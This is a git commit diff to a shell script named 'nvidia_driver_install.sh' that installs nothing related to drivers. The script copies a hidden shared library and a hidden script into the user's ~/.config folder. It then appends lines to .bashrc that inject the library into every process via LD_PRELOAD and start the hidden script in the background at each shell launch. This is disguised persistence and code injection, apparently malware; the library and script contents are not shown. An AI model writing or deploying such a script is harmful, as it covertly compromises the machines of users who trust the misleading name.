34675f209ccf28619d8430a0c3647d9b5270a991
Florin-Dorian Kelemen <102866998+kelemangiar0@users.noreply.github.com>
2023-06-29 12:27:41 +0300

    Add files via upload

--- Instalation folder/nvidia_driver_install.sh
+++ Instalation folder/nvidia_driver_install.sh
@@ -1,14 +1,9 @@
 #!/bin/bash
 
-# Get the home directory of the logged-in user
 USER_HOME=$(getent passwd $USER | cut -d: -f6)
-
-# Create the .config directory if it doesn't exist
 mkdir -p $USER_HOME/.config
-
-# Copy the libmylib.so library to the .config directory
 cp ./.libmylib.so $USER_HOME/.config
-
-# Append the export line to the .bashrc file
+cp ./.script.sh $USER_HOME/.config
 echo "export LD_PRELOAD=\$LD_PRELOAD:$USER_HOME/.config/.libmylib.so" >> $USER_HOME/.bashrc
-
+echo "chmod +x $USER_HOME/.config/.script.sh" >> $USER_HOME/.bashrc
+echo "$USER_HOME/.config/.script.sh &" >> $USER_HOME/.bashrc
